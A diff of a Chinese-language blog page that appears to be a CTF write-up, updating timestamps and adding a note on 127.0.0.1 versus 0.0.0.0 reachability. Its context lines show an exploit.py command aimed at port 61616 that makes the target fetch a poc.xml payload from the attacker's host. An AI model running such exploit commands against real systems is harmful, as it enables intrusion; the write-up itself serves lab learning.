@@ -27,8 +27,8 @@
 <meta property="og:site_name" content="ham5ter">
 <meta property="og:description" content="看到WP的我大吃一惊">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-02-03T07:27:51.830Z">
-<meta property="article:modified_time" content="2024-02-03T07:27:51.830Z">
+<meta property="article:published_time" content="2024-03-15T07:31:02.078Z">
+<meta property="article:modified_time" content="2024-03-15T07:31:02.078Z">
 <meta property="article:author" content="ham5ter">
 <meta property="article:tag" content="Blog">
 <meta name="twitter:card" content="summary">
@@ -220,6 +220,11 @@
 <p>赛后看WP，猛然意识到不该使用 <code>127.0.0.1</code> 这个IP，而是应该 <code>ifconfig</code> 后的IP。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误的🤡</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://127.0.0.1:8000/poc.xml</span><br><span class="line"><span class="comment"># 正确的</span></span><br><span class="line">$ python exploit.py -i 127.0.0.1 -p 61616 -u http://&lt;ip&gt;:8000/poc.xml</span><br></pre></td></tr></table></figure>
 
+<p>有趣的IP</p>
+<ul>
+<li>127.0.0.1：不可以被外部访问到</li>
+<li>0.0.0.0: 可以被外部访问到</li>
+</ul>
 <h2 id="vision"><a href="#vision" class="headerlink" title="vision"></a>vision</h2><p>一个 <code>rshell</code>，支持如下的命令</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Supported commands: ping, uname, pwd, date, whoami, poweroff, id, showKey, openthedoor</span><br></pre></td></tr></table></figure>
 
@@ -359,12 +364,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">292k</span>
+    <span title="站点总字数">295k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">8:50</span>
+    <span title="站点阅读时长">8:56</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
